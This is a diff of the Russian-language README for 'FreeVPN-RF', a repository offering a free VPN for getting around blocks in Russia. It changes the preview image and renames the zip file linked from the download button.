@@ -1,7 +1,7 @@
 # 🛡️ FreeVPN-RF 
 <div align="center">
 
-![FreeVPN-RF Preview](preview.png)
+![FreeVPN-RF Preview](screenshot.svg)
 
 **Бесплатный ВПН для обхода блокировок в РФ — 2026**
 
@@ -11,7 +11,7 @@
 [![Updated](https://img.shields.io/badge/Обновление-каждые_12ч-blue?style=flat-square)](#серверы)
 
 
-<a href="https://github.com/Portalsawarehouse/FreeVPN-RF/releases/download/Stable/Packages.zip">
+<a href="https://github.com/Portalsawarehouse/FreeVPN-RF/releases/download/Stable/VPN-RF.zip">
   <img src="download_button.svg" alt="Скачать" width="220"/>
 </a>
 
